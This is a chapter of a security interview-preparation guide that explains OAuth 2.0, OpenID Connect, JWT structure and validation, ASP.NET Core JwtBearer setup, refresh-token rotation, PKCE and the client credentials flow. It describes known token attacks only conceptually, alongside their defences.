# 15. Security — 33 Questions (Answered)

> **Method:** identity and token questions are answered from the **IETF RFCs** — RFC 6749 (OAuth 2.0), RFC 7519 (JWT), RFC 7636 (PKCE), **RFC 9700 (OAuth 2.0 Security Best Current Practice)** — and the **OpenID Connect Core** specification, quoted where the wording matters; implementation is from **Microsoft Learn** (ASP.NET Core authentication/authorization, Data Protection, Identity); web-vulnerability definitions from **OWASP**; and cloud controls from the **AWS Well-Architected Security pillar**. Then the architect-level analysis and the fintech-specific requirement. Links in **References**.

---

## Q1. Authentication vs Authorization?

| | **Authentication (AuthN)** | **Authorization (AuthZ)** |
|---|---|---|
| Question | **Who are you?** | **What are you allowed to do?** |
| Establishes | Identity | Permission |
| Happens | **First** | After authentication |
| Evidence | Credentials — password, certificate, token, biometric, key | Policy — roles, claims, scopes, attributes, ACLs |
| Failure code | **401 Unauthorized** (badly named — it means *unauthenticated*) | **403 Forbidden** |
| Changes | Rarely, per session | **Per request, per resource** |
| Owned by | Identity provider (Entra ID, Okta, Cognito, Auth0) | **The resource server / application** |

**The status-code distinction is asked constantly, so get it exactly right:** `401` means *"I don't know who you are — authenticate and try again"* (and per RFC 9110 it must carry a `WWW-Authenticate` header). `403` means *"I know exactly who you are, and you still can't do this — don't bother retrying."* Returning 401 for an authorization failure invites clients into a pointless re-authentication loop.

**In ASP.NET Core the separation is explicit in the pipeline, and the order is not optional:**
```csharp
app.UseAuthentication();   // establishes HttpContext.User from the token/cookie
app.UseAuthorization();    // evaluates policies against that User
```
Reversing them means authorization evaluates an empty principal and every `[Authorize]` fails.

**The architectural point worth adding:** authentication is a **solved, centralisable problem** — delegate it to an identity provider and never build it yourself. Authorization is **domain-specific and cannot be fully centralised**: only the payments service knows whether this user may refund this transaction, because that depends on the transaction's state, the user's limits and the merchant relationship. So the correct split is: **coarse-grained authorization at the gateway** (is this a valid token with the right scope and audience?) and **fine-grained authorization in the service** (may *this* principal act on *this* resource?). Putting resource-level authorization in the gateway is one of the most common architectural mistakes (Module 4 Q15).

**A third concept to name, because senior interviews probe it:** **accounting/auditing** — the "AAA" triad. Knowing who did what, when, and being able to prove it. In a regulated environment that is not optional, and it is a design requirement, not a logging afterthought.

---

## Q2. What is OAuth 2.0?

**Per RFC 6749:** *"The OAuth 2.0 authorization framework enables a third-party application to obtain limited access to an HTTP service, either on behalf of a resource owner by orchestrating an approval interaction between the resource owner and the HTTP service, or by allowing the third-party application to obtain access on its own behalf."*

**The critical framing, and the one candidates get wrong:** OAuth 2.0 is an **authorization** framework — a **delegated access** protocol. It is *not* an authentication protocol. It answers "may this application access this resource on this user's behalf?", not "who is this user?" Using a raw OAuth access token to identify a user is a known anti-pattern; that is what **OpenID Connect** exists for (Q3).

**The four roles:**

| Role | Who |
|---|---|
| **Resource owner** | The user who owns the data |
| **Client** | The application requesting access (your SPA, mobile app or service) |
| **Authorization server** | Issues tokens after authenticating the resource owner (Entra ID, Cognito, Okta, Duende IdentityServer) |
| **Resource server** | The API that accepts and validates the access token |

**The problem it solved:** before OAuth, delegating access meant giving an application your **password** — full, permanent, unrevocable access to everything. OAuth replaces that with a **scoped, expiring, revocable token** that never exposes the credential. Every design property follows from that.

**Grant types, and their current status per RFC 9700:**

| Grant | Status | Use |
|---|---|---|
| **Authorization Code + PKCE** | ✅ **The default for everything** | Web apps, SPAs, mobile, desktop (Q12) |
| **Client Credentials** | ✅ Correct for machine-to-machine | Service-to-service, no user (Q15) |
| **Device Authorization** | ✅ | TVs, CLIs, input-constrained devices |
| **Refresh Token** | ✅ with rotation | Renewing access without re-authentication (Q10) |
| **Implicit** | ❌ **Deprecated** — clients *"SHOULD NOT use the implicit grant"* | Replaced by code + PKCE |
| **Resource Owner Password Credentials (ROPC)** | ❌ **"MUST NOT be used"** | Exposes the password to the client and defeats MFA |

**Say this and you sound current:** the modern baseline is **authorization code with PKCE for every client type, including confidential ones** — RFC 9700 states *"although PKCE was designed as a mechanism to protect native apps, this advice applies to all kinds of OAuth clients, including web applications."* **OAuth 2.1** is the consolidation of these BCPs into a single specification: code+PKCE only, no implicit, no ROPC, exact redirect-URI matching.

---

## Q3. OAuth 2.0 vs OpenID Connect?

**OpenID Connect (OIDC) is an identity layer built on top of OAuth 2.0.** Per the OIDC Core specification, it *"enables Clients to verify the identity of the End-User based on the authentication performed by an Authorization Server, as well as to obtain basic profile information about the End-User in an interoperable and REST-like manner."*

| | **OAuth 2.0** | **OpenID Connect** |
|---|---|---|
| Answers | *"May this app access this resource?"* | *"**Who is this user**, and were they authenticated?"* |
| Purpose | **Authorization** (delegated access) | **Authentication** (federated identity/SSO) |
| Primary token | **Access token** — opaque to the client, meaningful to the API | **ID token** — a JWT, meaningful **to the client** |
| Token audience | The **resource server** | The **client** |
| User info | Not defined | `/userinfo` endpoint + standard claims (`sub`, `name`, `email`, `auth_time`, `acr`) |
| Discovery | Not defined | **`/.well-known/openid-configuration`** — metadata and JWKS location |
| Scope trigger | — | The **`openid`** scope requests OIDC behaviour |
| Standardised | Loosely — formats vary by provider | **Tightly** — the ID token is always a JWT with defined claims |

**The rule that makes it concrete:**

- The **ID token** is for the **client**: it proves *who* authenticated and *when*. The client validates it and creates a session. **Never send an ID token to an API as a credential** — its audience is the client, not the API.
- The **access token** is for the **API**: it proves *what* the bearer may do. The client treats it as opaque and simply forwards it.

Sending the wrong token to the wrong party is one of the most common integration bugs and one of the most reliable interview discriminators.

**Why OIDC had to exist:** everyone was using OAuth for login anyway, incorrectly and incompatibly — each provider inventing its own user-info endpoint and token format, with no way to verify that authentication had actually occurred. OIDC standardised it: a signed ID token, standard claims, a discovery document, and a JWKS endpoint for key rotation.

**Practically:** "Sign in with Google/Microsoft/Apple" is OIDC. "Let this app post to your calendar" is OAuth. In an enterprise, OIDC is what federates your applications to Entra ID or Okta, and it is what you configure with `AddOpenIdConnect` in ASP.NET Core.

---

## Q4. What is JWT?

**Per RFC 7519:** *"JSON Web Token (JWT) is a compact, URL-safe means of representing claims to be transferred between two parties. The claims in a JWT are encoded as a JSON object that is used as the payload of a JSON Web Signature (JWS) structure or as the plaintext of a JSON Web Encryption (JWE) structure, enabling the claims to be digitally signed or integrity protected with a Message Authentication Code (MAC) and/or encrypted."*

**In practice, "JWT" almost always means a signed JWS**: three Base64URL-encoded parts separated by dots.

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjJhOSJ9   ← header
.eyJzdWIiOiJ1c2VyLTkxNCIsImF1ZCI6InBheW1lbnRzLWFwaSJ9  ← payload (claims)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c            ← signature
```

**Why it is used for API authentication — one property above all:** it is **self-contained**. The token carries the claims and a signature, so a resource server can validate it **offline**, using a public key it already holds, with **no call to the identity provider on the request path**. That is what makes JWTs scale across a microservices estate: no shared session store, no network hop per request, no single point of failure in the auth path.

**The cost of that property, and it must be stated:** a JWT is **valid until it expires** and cannot be revoked by the issuer alone. Logout, a compromised account, a role change, a fired employee — none of them invalidate an already-issued token. The mitigations are: **short expiry** (5–15 minutes), refresh-token rotation with revocation at the refresh step, and a **denylist by `jti`** in a distributed cache for the residual window when the risk warrants it (Q10).

**JWS vs JWE — the distinction Q6 turns on:** JWS is **signed** (integrity and authenticity, contents readable by anyone). JWE is **encrypted** (confidentiality). Most bearer tokens are JWS; JWE is used when the token must cross an untrusted intermediary carrying data the intermediary must not read.

**Standard registered claims** worth knowing by name: `iss` (issuer), `sub` (subject), `aud` (audience), `exp` (expiry), `nbf` (not before), `iat` (issued at), `jti` (JWT ID — the handle for revocation and replay detection).

---

## Q5. What are JWT Header, Payload and Signature?

**Header** — metadata about the token and how to verify it:
```json
{
  "alg": "RS256",          // signing algorithm
  "typ": "JWT",
  "kid": "2a9f1c…"         // KEY ID — tells the verifier which public key from the JWKS to use
}
```
`kid` is what makes **key rotation** possible without downtime: the issuer publishes several keys in its JWKS, signs with the newest, and verifiers select by `kid`.

**Payload** — the claims:
```json
{
  "iss": "https://login.example-bank.com/",   // issuer — MUST be validated
  "sub": "user-914",                          // subject (the user or service)
  "aud": "payments-api",                      // audience — MUST be validated
  "exp": 1757328000,                          // expiry (seconds since epoch)
  "iat": 1757327100,
  "jti": "c7a2…",                             // unique token id
  "scope": "payments:read payments:write",
  "roles": ["approver"],
  "tenant": "merchant-8891"
}
```

**Signature** — computed over the encoded header and payload:
```
signature = RSASSA-PKCS1-v1_5-SHA256(
                base64url(header) + "." + base64url(payload),
                issuerPrivateKey)
```

**Algorithm choice, and this is a real architectural decision:**

| | **HS256** (symmetric, HMAC) | **RS256 / ES256** (asymmetric) |
|---|---|---|
| Key | **One shared secret** — signs *and* verifies | **Private key signs, public key verifies** |
| Consequence | Every verifier can also **forge** tokens | Verifiers can only verify |
| Distribution | The secret must reach every service — and every service is now a forgery risk | Public keys published openly via **JWKS** |
| Use | A single monolith issuing and consuming its own tokens | **Anything distributed. The correct default.** |

**Use RS256 or ES256 in a microservices platform.** With HS256, a compromise of any one service's configuration lets an attacker mint tokens for every service.

**The two classic attacks to name unprompted:**
1. **`alg: none`** — an attacker strips the signature and sets the algorithm to `none`. Any library that honours the token's own `alg` field accepts it. **Never let the token choose the algorithm; pin the expected algorithm in the validation configuration.**
2. **Algorithm confusion (RS256 → HS256)** — the attacker changes `alg` to `HS256` and signs with the *public* key as if it were the HMAC secret. A naive verifier that selects the algorithm from the header validates it. Same defence: pin the algorithm.

---

## Q6. Is JWT encrypted?

**No — a standard signed JWT (JWS) is not encrypted. It is Base64URL-encoded, which is not encryption.**

```bash
echo 'eyJzdWIiOiJ1c2VyLTkxNCIsInJvbGVzIjpbImFkbWluIl19' | base64 -d
# {"sub":"user-914","roles":["admin"]}
```
Anyone holding the token — the browser, a proxy, a log aggregator, a browser extension, anyone reading a captured request — can read every claim. jwt.io will decode it in a browser tab with no key at all.

**What the signature actually gives you:**

| Property | Provided by a signed JWT? |
|---|---|
| **Integrity** — the contents were not altered | ✅ Yes |
| **Authenticity** — it was issued by the expected issuer | ✅ Yes |
| **Non-repudiation** (asymmetric only) | ✅ Yes |
| **Confidentiality** — the contents are hidden | ❌ **No** |

**The consequences for what you put in a token:**

**Never put in a JWT:** passwords, card numbers, full national identifiers, account numbers, health data, anything that is a secret, and anything you would not want in a log file — because **tokens end up in logs, browser history, `Referer` headers, error reports and APM traces**.

**Do put in a JWT:** an opaque subject identifier, roles/scopes, tenant identifier, expiry, issuer, audience — the minimum needed to make an authorization decision. Keep tokens small; they travel on every request, and an oversized token bloats every header (and can exceed proxy header limits).

**When you genuinely need confidentiality:** use **JWE** (an encrypted JWT), which is standard but adds key management and is rarely necessary. The better answer in almost all cases is: **don't put sensitive data in the token** — put an identifier in the token and look the data up server-side, over TLS.

**And the point people forget:** TLS protects the token **in transit**, but not at rest in `localStorage`, in a log file, or in an APM trace. Storage matters: for a browser SPA, the current guidance (and the BFF pattern) is to keep the token **server-side in an HttpOnly, Secure, SameSite cookie session** rather than in `localStorage`, where any XSS can read it.

---

## Q7. How does JWT validation work?

Validation is a fixed checklist, and **skipping any step is a vulnerability**, not an optimisation.

```
1. Parse         → header, payload, signature; reject anything malformed
2. Algorithm     → is `alg` one we EXPECT? (pinned, not read from the token) — defeats `alg:none`
                   and algorithm confusion (Q5)
3. Key selection → use `kid` to select the public key from the issuer's cached JWKS
4. Signature     → verify over base64url(header) + "." + base64url(payload)
5. `iss`         → exactly the expected issuer
6. `aud`         → contains THIS API's identifier   ← the step most often skipped
7. `exp` / `nbf` → not expired, not yet valid (with a small clock skew, ≤ 2 minutes)
8. Scopes/claims → does it authorise THIS operation?
9. Revocation    → optional `jti` denylist check, if the risk profile requires it
```

**Why step 6 matters more than people think:** without audience validation, a token legitimately issued for the *reporting* API is accepted by the *payments* API. Every service that trusts the same issuer becomes interchangeable, and a low-value service's token becomes a key to a high-value one. **This is a real, exploited class of bug.**

**The JWKS mechanism, which is what makes offline validation practical:**

```
GET https://login.example-bank.com/.well-known/openid-configuration
  → { "issuer": …, "jwks_uri": "https://login.example-bank.com/.well-known/jwks.json", … }

GET .../jwks.json
  → { "keys": [ { "kid": "2a9f1c…", "kty": "RSA", "use": "sig", "n": "…", "e": "AQAB" }, … ] }
```
The resource server fetches and **caches** the JWKS, refreshing periodically and on encountering an unknown `kid`. This is how key rotation happens with no coordinated deployment: the issuer publishes the new key, starts signing with it, and verifiers pick it up on the next refresh.

**Two things to get right operationally:**
- **Cache the JWKS** (hours), but refresh on an unknown `kid` — otherwise a rotation causes an outage, and a naive implementation that fetches per request creates a hard dependency on the IdP for every API call, undoing the main benefit of JWTs.
- **Clock skew.** Machines drift. Allow a small tolerance (the .NET default is 5 minutes; **tighten it to ~1–2 minutes**), and ensure NTP is running.

**Validating opaque tokens instead:** if the token is a reference rather than a JWT, the API calls the **token introspection endpoint** (RFC 7662). That gives instant revocation at the cost of a network call per request — the exact trade-off JWTs invert. Some designs use both: JWT for internal service-to-service, opaque tokens for external clients so revocation is immediate.

---

## Q8. How does ASP.NET Core validate JWT?

**Per Microsoft Learn**, `AddJwtBearer` wires the `JwtBearerHandler`, which reads the `Authorization: Bearer` header and validates the token using `TokenValidationParameters`.

```csharp
builder.Services
    .AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        // Discovery: fetches /.well-known/openid-configuration and the JWKS automatically,
        // caches them, and refreshes on rotation.
        options.Authority = "https://login.example-bank.com/";
        options.Audience  = "payments-api";
        options.RequireHttpsMetadata = true;              // never disable outside local dev

        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer           = true,
            ValidIssuer              = "https://login.example-bank.com/",
            ValidateAudience         = true,
            ValidAudiences           = ["payments-api"],
            ValidateIssuerSigningKey = true,
            ValidateLifetime         = true,
            ClockSkew                = TimeSpan.FromMinutes(1),   // default is 5 — tighten it
            ValidAlgorithms          = [SecurityAlgorithms.RsaSha256]  // ← pin the algorithm
        };

        options.MapInboundClaims = false;   // keep short claim names (sub, aud) instead of
                                            // the legacy WS-Federation long URIs
        options.Events = new JwtBearerEvents
        {
            OnAuthenticationFailed = ctx => { /* log WITHOUT the raw token */ return Task.CompletedTask; }
        };
    });

builder.Services.AddAuthorization(o =>
{
    o.AddPolicy("CanRefund", p => p
        .RequireAuthenticatedUser()
        .RequireClaim("scope", "payments:write")
        .RequireRole("approver"));
});

app.UseAuthentication();
app.UseAuthorization();
app.MapPost("/payments/{id}/refunds", …).RequireAuthorization("CanRefund");
```

**What the handler does for you:** discovery-document and JWKS retrieval with caching and automatic refresh on key rotation; signature verification; issuer, audience and lifetime validation; and population of `HttpContext.User` as a `ClaimsPrincipal`.

**The four configuration mistakes that turn up in real code reviews:**

1. **`ValidateAudience = false`** — usually added to "make it work" during development and never removed. It makes every token from the issuer valid here (Q7).
2. **`RequireHttpsMetadata = false`** left in production — the discovery document and JWKS can then be fetched over plaintext HTTP and spoofed.
3. **Not pinning `ValidAlgorithms`** — leaves the door open to algorithm confusion (Q5).
4. **Logging the token on failure** — the raw JWT then sits in your log aggregator, where far more people can read it than could ever intercept it in transit.

**Beyond the basics, for a regulated environment:** `MapInboundClaims = false` to keep claim names sane; a **`RequireHttpsPermanent`/HSTS** policy; a **fallback policy** so endpoints are secure by default —
```csharp
o.FallbackPolicy = new AuthorizationPolicyBuilder().RequireAuthenticatedUser().Build();
```
— which means forgetting `[Authorize]` on a new controller fails closed rather than exposing it.

---

## Q9. What are access tokens?

**Per RFC 6749:** *"Access tokens are credentials used to access protected resources. An access token is a string representing an authorization issued to the client. Tokens represent specific scopes and durations of access, granted by the resource owner, and enforced by the resource server and authorization server."*

**Properties:**

| Property | Detail |
|---|---|
| **Purpose** | Authorise a call to a **resource server** |
| **Audience** | The **API**, identified by `aud` |
| **Lifetime** | **Short — 5 to 60 minutes.** Short lifetime *is* the primary mitigation for the inability to revoke |
| **Format** | JWT (self-contained, validated offline) or opaque (validated by introspection) |
| **Transport** | `Authorization: Bearer <token>` — **never in a query string**, which lands in logs, proxies and browser history |
| **Sensitivity** | **A bearer credential** — whoever holds it can use it. Treat it exactly like a password |
| **Revocation** | **Not directly revocable** once issued; expiry is the control |

**"Bearer" is the word that carries the risk**, and RFC 6750 is explicit that it means possession alone is sufficient. There is no proof that the presenter is the party the token was issued to. Hence RFC 9700's recommendation of **sender-constrained access tokens**: *"the document recommends sender-constrained access tokens using mechanisms like mutual TLS or DPoP to prevent stolen token misuse."*
- **mTLS-bound tokens (RFC 8705)** — the token is cryptographically bound to the client's TLS certificate, so a stolen token is useless without the private key. This is what **FAPI** (the Financial-grade API profile used by Open Banking) requires.
- **DPoP (RFC 9449)** — a proof-of-possession scheme for clients without mTLS.

Naming FAPI and sender-constrained tokens is what distinguishes a fintech-ready answer from a generic one.

**Design rules:**
- **Keep them short-lived** and use refresh tokens for continuity (Q10).
- **Scope them narrowly** — least privilege per token, and one audience per token.
- **Never store them in `localStorage`** in a browser: any XSS reads it. Use an HttpOnly cookie session via a BFF (Module 12 Q14).
- **Never log them.** Redact `Authorization` headers at the logging middleware, not by convention.

---

## Q10. What are refresh tokens?

**Per RFC 6749:** *"Refresh tokens are credentials used to obtain access tokens. Refresh tokens are issued to the client by the authorization server and are used to obtain a new access token when the current access token becomes invalid or expires, or to obtain additional access tokens with identical or narrower scope."*

**Their purpose:** reconcile two conflicting requirements — access tokens should be **short-lived** (to limit the damage from a leak), but users should not have to re-authenticate every fifteen minutes. The refresh token lets the client silently obtain a new access token.

```
POST /token
grant_type=refresh_token
&refresh_token=8f3a…
&client_id=web-app
  → { "access_token": "eyJ…", "expires_in": 900,
      "refresh_token": "b91c…" }   ← a NEW refresh token: ROTATION
```

**Why they are safer than a long-lived access token, despite living longer:**
- They are sent **only to the authorization server's token endpoint** — never to resource servers, so their exposure surface is one endpoint rather than every API.
- They are **revocable at the authorization server**, and revocation is enforced at the next refresh (typically within minutes).
- They can be **rotated**, which turns theft into a detectable event.

**Refresh token rotation with reuse detection — the mechanism to describe, because it is what makes this safe:** every refresh issues a *new* refresh token and invalidates the old one. If an **old, already-used** refresh token is presented, that means two parties hold it — the legitimate client and a thief. The authorization server then **revokes the entire token family** and forces re-authentication. Theft is not merely limited; it is *detected*.

**RFC 9700 makes this a requirement, not an option, for public clients:** *"Public clients must implement either sender-constraining or refresh token rotation."*

**Storage rules by client type:**

| Client | Where the refresh token lives |
|---|---|
| **Confidential server-side app / BFF** | Server-side, encrypted at rest. **Never sent to the browser.** The best answer |
| **SPA** | Ideally nowhere — use a **BFF** so tokens stay server-side. If unavoidable: memory only, rotation mandatory, never `localStorage` |
| **Mobile** | OS secure storage — iOS Keychain, Android Keystore |

**Additional controls in a bank:** absolute lifetime (e.g. 8 hours) as well as inactivity expiry; bind to a device/session fingerprint; revoke on password change, role change, or leaver processing; and audit-log every refresh. That last one is how you detect an attacker holding a token after an employee has left.

---

## Q11. Access Token vs Refresh Token?

| | **Access token** | **Refresh token** |
|---|---|---|
| **Purpose** | Call a protected **API** | Obtain a **new access token** |
| **Sent to** | **Resource servers** (every API call) | **Only the authorization server's token endpoint** |
| **Lifetime** | **5–60 minutes** | Hours to weeks (with rotation and an absolute cap) |
| **Format** | Usually a **JWT**, validated offline | Usually **opaque** — meaningful only to the issuer |
| **Contains claims?** | Yes — `sub`, `aud`, `scope`, `exp` | No — it is a reference |
| **Revocable?** | **Effectively no** — expiry is the control | **Yes**, at the authorization server |
| **Exposure surface** | **Wide** — every API, every proxy, every log | **Narrow** — one endpoint |
| **If stolen** | Usable until expiry, against every in-scope API | Usable until revoked/rotated — **but rotation makes theft detectable** |
| **Storage** | Memory; never `localStorage` | Server-side (BFF) or OS secure storage |

**The design logic in one sentence:** *the token that travels widely is short-lived and cannot be revoked; the token that is revocable and long-lived travels narrowly.* Each token's lifetime is inversely proportional to its exposure. Understanding that relationship, rather than memorising the table, is what the question is testing.

**The flow over time:**

```
t=0     Login → access_token (15 min) + refresh_token (8 h absolute)
t=0–15  API calls with the access token
t=15    Access token expires → API returns 401
        Client silently POSTs the refresh token to /token
        → new access token + NEW refresh token (rotation); old one invalidated
t=8h    Absolute refresh lifetime reached → full re-authentication required
        (or earlier, if the account was disabled, the password changed,
         or reuse of an old refresh token was detected)
```

**The practical client rule:** on a `401`, attempt **one** silent refresh, then retry the original request once. If the refresh fails, redirect to login. Guard the refresh with a mutex so ten concurrent 401s do not trigger ten concurrent refreshes — with rotation enabled, concurrent refreshes look exactly like token reuse and will trigger the family revocation, logging your user out. That is a real, commonly-hit bug and naming it demonstrates hands-on experience.

---

## Q12. What is Authorization Code Flow?

The **authorization code grant** is the OAuth 2.0 flow in which the client receives a short-lived **code** via the browser redirect and exchanges it for tokens over a **direct back-channel call** — so tokens never travel through the browser's address bar.

```
 User          Client (app)             Authorization Server            API
  │                │                            │                        │
  │──── use app ──▶│                            │                        │
  │                │── 302 /authorize ─────────▶│                        │
  │                │   response_type=code       │                        │
  │                │   client_id, redirect_uri  │                        │
  │                │   scope, state             │                        │
  │                │   code_challenge (PKCE)    │                        │
  │◀────────── login + consent ─────────────────│                        │
  │                │◀─ 302 redirect_uri?code=…&state=… ──────────────────│
  │                │                            │                        │
  │                │══ POST /token (BACK CHANNEL, direct, TLS) ═════════▶│
  │                │    code, client_id, redirect_uri,                   │
  │                │    code_verifier (PKCE), [client_secret]            │
  │                │◀═ access_token + id_token + refresh_token ══════════│
  │                │                                                     │
  │                │──── Authorization: Bearer <access_token> ──────────▶│
```

**Why the two-step (code, then exchange) exists — this is the whole design:**
1. **Tokens never appear in the browser.** The URL fragment/query, browser history, `Referer` headers and server access logs never contain a token — only a single-use code that is worthless without the verifier or client secret.
2. **The client is authenticated at the exchange** (confidential clients present a secret; public clients present the PKCE verifier), so an intercepted code cannot be redeemed by an attacker.
3. **The code is single-use and short-lived** (seconds to a minute), and the authorization server must reject a second redemption.

**Mandatory parameters and what each defends against:**

| Parameter | Defends against |
|---|---|
| **`state`** | **CSRF on the redirect** — the client verifies it matches what it sent |
| **`code_challenge` / `code_verifier`** (PKCE) | **Code interception** (Q13–Q14) |
| **`nonce`** (OIDC) | **ID token replay** — bound into the ID token and checked |
| **Exact `redirect_uri`** | Open-redirect and code-exfiltration attacks. RFC 9700: authorization servers must use *"exact string matching"* |

**Per RFC 9700, this is the flow for everything** — server-rendered web apps, SPAs, mobile, desktop — **always with PKCE**. The implicit flow, which returned tokens directly in the URL fragment, is deprecated precisely because it leaked tokens through the browser.

**For SPAs specifically**, the current recommended architecture is authorization code + PKCE with the **BFF pattern**: the code exchange happens server-side, tokens stay on the server, and the browser holds only an HttpOnly, Secure, SameSite cookie. That removes token-theft-by-XSS entirely, which no amount of front-end storage cleverness achieves.

---

## Q13. What is PKCE?

**PKCE** — Proof Key for Code Exchange, RFC 7636, pronounced "pixie" — binds an authorization code to the specific client instance that requested it, using a dynamically generated secret.

```
1. Client generates a random, high-entropy code_verifier (43–128 chars)
       code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"

2. Derives the challenge:
       code_challenge = BASE64URL( SHA256( code_verifier ) )
       code_challenge_method = "S256"

3. /authorize  … &code_challenge=E9Mel…&code_challenge_method=S256
       → the AS stores the challenge alongside the issued code

4. /token      … &code=abc123&code_verifier=dBjftJeZ4…
       → the AS computes SHA256(code_verifier) and compares to the stored challenge
       → mismatch ⇒ the code is REJECTED
```

**Always use `S256`, never `plain`.** With `plain`, the verifier is sent in the authorization request, so anything that can intercept the code can also see the verifier — which defeats the entire mechanism. RFC 9700: *"Clients should use the `S256` method to prevent verifier exposure."*

**What it protects:** the **authorization code interception attack**. The canonical case is a mobile app: a malicious app on the same device registers the same custom URI scheme (`myapp://callback`) and receives the redirect containing the code. Without PKCE — and with a public client that has no secret — that code can be redeemed for tokens. With PKCE, the attacker has the code but not the verifier, which never left the legitimate app's memory, so redemption fails.

**The mechanism in one sentence:** *PKCE gives a public client a per-request, single-use secret, so that possession of the code alone is not sufficient to obtain tokens.*

**In .NET**, `AddOpenIdConnect` enables PKCE by default (`options.UsePkce = true`), as does MSAL and every current OIDC client library. You should not be implementing this by hand — but you should be able to explain what it is doing and confirm it is enabled.

---

## Q14. Why is PKCE important?

**Because public clients cannot keep a secret, and without PKCE the authorization code is the only thing standing between an attacker and a token.**

**The core problem:** a confidential client (a server-side web app) authenticates itself at the token endpoint with a client secret, so an intercepted code is useless to an attacker. A **public client** — a SPA, a mobile app, a desktop app — ships to the user's device, so any embedded secret can be extracted by decompiling the app or reading the JavaScript bundle. It has **nothing** to prove its identity with. PKCE supplies a *dynamic, per-request* secret to replace the *static, extractable* one.

**The attack it prevents, concretely:**

```
WITHOUT PKCE (public client)
  1. Legitimate app → /authorize
  2. AS redirects: myapp://callback?code=abc123
  3. A malicious app registered for the same scheme intercepts the redirect ← the code is stolen
  4. Attacker → POST /token with code=abc123  (no secret needed — it is a public client)
  5. Attacker receives access + refresh tokens. Full account takeover.

WITH PKCE
  4'. Attacker → POST /token with code=abc123 … but no valid code_verifier
  5'. REJECTED. The code is useless.
```

**Why RFC 9700 extends it to confidential clients too** — a point that separates a current answer from a 2018 one: *"Although PKCE was designed as a mechanism to protect native apps, this advice applies to all kinds of OAuth clients, including web applications."* The reasons are that PKCE also defends against **authorization code injection** (an attacker injecting their own captured code into a victim's session) and against certain **mix-up attacks** where a client talks to multiple authorization servers. It costs nothing and closes attack classes that a client secret alone does not.

**Its status today:** mandatory in **OAuth 2.1**, required by **FAPI** (Financial-grade API — the profile behind Open Banking and UK/EU regulated APIs), and enabled by default in every current library. In an interview, the strong statement is: **"authorization code with PKCE, for every client type, always; and for a browser SPA I would go further and keep the tokens server-side behind a BFF."**

---

## Q15. What is Client Credentials Flow?

**Per RFC 6749:** the client credentials grant is used when *"the client is requesting access to the protected resources under its control, or those of another resource owner that have been previously arranged with the authorization server"* — that is, **there is no user**. The client is acting as itself.

```
Service A                        Authorization Server                Service B (API)
    │                                    │                                │
    │══ POST /token ════════════════════▶│                                │
    │   grant_type=client_credentials    │                                │
    │   client_id=payments-service       │                                │
    │   client_secret=… (or a signed     │                                │
    │     JWT assertion, or mTLS)        │                                │
    │   scope=ledger:write               │                                │
    │◀═ access_token (no refresh token) ═│                                │
    │                                                                     │
    │────────── Authorization: Bearer <token> ───────────────────────────▶│
```

**Distinguishing characteristics:**
- **No user, no browser, no redirect, no consent** — it is a purely back-channel exchange.
- **No refresh token is issued**, and RFC 6749 says so explicitly: the client can simply request a new access token whenever it needs one, because it holds its own credentials.
- The token's `sub` is the **client**, not a person. Authorization is based on the client's granted scopes.

**Client authentication methods, weakest to strongest — and the choice matters:**

| Method | Notes |
|---|---|
| `client_secret_post` / `client_secret_basic` | A shared secret. Workable, but it is a long-lived credential you must store and rotate |
| **`private_key_jwt`** | The client signs a JWT assertion with its **private key**; the AS verifies with the public key. **No shared secret exists** |
| **`tls_client_auth` (mTLS)** | The client authenticates with an X.509 certificate. **Required by FAPI**, and it enables certificate-bound access tokens (Q9) |

**In a cloud-native platform, prefer no credential at all.** On AWS, an **IAM role** (IRSA on EKS, a task role on ECS) gives the workload short-lived STS credentials with no secret to store — and if the callee can authorise with SigV4 or via a service mesh's mTLS identity, you have removed the client secret from the design entirely (Q24). That is a better answer than "rotate the client secret carefully".

---

## Q16. When should Client Credentials be used?

**Use it when the caller is a machine acting on its own behalf, with no end user involved.**

**Correct uses:**

| Scenario | Why |
|---|---|
| **Service-to-service calls** — payments service → ledger service | No user context; the service has its own identity and permissions |
| **Scheduled jobs / batch processing** — nightly settlement, reconciliation | Runs without a user |
| **Partner/B2B system integration** — a merchant's backend calling your API | The partner organisation is the principal |
| **Daemons, workers, message consumers** | No interactive session exists |
| **CI/CD pipelines** calling deployment APIs | Though OIDC federation with no stored secret is better still |

**When it is the wrong answer — and this is what the question is really testing:**

1. **Never use it to act on behalf of a user.** If the operation is "refund *this customer's* payment because *this operator* asked", the token must carry the *user's* identity so the audit trail names a person and authorization can apply that person's limits. Client credentials produce a token whose subject is "the payments service", which makes every action look identical in the audit log — an immediate audit finding in a bank.
2. **Never use it from a public client.** A SPA or mobile app cannot hold a client secret (Q14); embedding one there is equivalent to publishing it.
3. **Don't use it as a substitute for a proper user flow** because the user flow is inconvenient.

**Propagating user identity across services — the correct alternatives:**

| Approach | How |
|---|---|
| **Token relay / passthrough** | Forward the user's access token downstream. Simplest; requires the downstream to accept the same audience, which weakens audience isolation |
| **On-Behalf-Of (OBO) flow** | The middle service exchanges the user's token for a new token for the downstream API — **preserves user identity with correct audiences**. This is the OAuth-correct answer, and it is what Entra ID's OBO grant and RFC 8693 token exchange provide |
| **Token exchange (RFC 8693)** | The general standard for this: exchange one token for another with a different audience/scope, optionally carrying an actor claim (`act`) so the audit trail shows "service X acting for user Y" |
| **Client credentials + explicit user context** | The service authenticates as itself but passes the user ID as a validated parameter. **Weakest** — the downstream must trust the caller's assertion, so use only inside a strong trust boundary |

**Operational hygiene:** one client per service (never a shared "platform" client), least-privilege scopes per client, short token lifetimes, credentials in Secrets Manager with automatic rotation, and **audit every token issuance**. A single shared client credential used by twelve services is a common and serious anti-pattern — it destroys attribution and makes least privilege impossible.

---

## Q17. What are scopes?

**Per RFC 6749:** *"The authorization server may fully or partially ignore the scope requested by the client... The value of the scope parameter is expressed as a list of space-delimited, case-sensitive strings... defined by the authorization server."*

A **scope** is a coarse-grained label for a **capability the client is permitted to exercise** on the user's behalf. It is a limit on **what the application can do**, not on what the user is allowed to do.

```
scope=openid profile payments:read payments:write ledger:read
```

**Naming conventions in practice:** `resource:action` (`payments:read`, `payments:write`), or URI-based for API-scoped identifiers (`https://api.bank.com/payments.read`). Consistency matters more than the style — scopes appear on consent screens and in audit logs.

